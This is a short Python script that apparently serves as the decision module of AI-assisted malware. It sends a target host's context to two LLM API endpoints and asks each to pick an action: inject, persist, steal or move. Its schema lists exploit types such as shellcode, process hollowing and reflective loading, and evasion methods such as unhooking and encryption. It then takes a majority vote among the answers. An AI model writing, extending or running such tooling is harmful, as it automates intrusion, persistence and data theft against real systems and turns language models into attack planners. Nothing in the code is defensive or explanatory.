import json
import urllib.request
from collections import Counter

ENDPOINTS = ["https://api.deepseek.com/local/schema", "https://api.mistral.ai/local/schema"]
SCHEMA = {"model": "", "decision": ["inject", "persist", "steal", "move"],
          "reasoning": "", "timestamp": "", "target_process": "",
          "exploit_type": ["shellcode", "dll", "process_hollow", "reflective"],
          "evasion_method": ["obfuscate", "encrypt", "sleep", "unhook"],
          "payload_config": {}}

def choose(host_context, api_key):
    votes = []
    for endpoint in ENDPOINTS:
        payload = {"model": "configured-model", "messages": [{"role": "user", "content": json.dumps({"target": host_context, "schema": SCHEMA})}]}
        request = urllib.request.Request(endpoint, data=json.dumps(payload).encode(), headers={"Authorization": "Bearer " + api_key, "Content-Type": "application/json"})
        with urllib.request.urlopen(request) as response:
            decision = json.loads(json.loads(response.read())["choices"][0]["message"]["content"])
        if decision["decision"] in SCHEMA["decision"]:
            votes.append(decision["decision"])
    return Counter(votes).most_common(1)
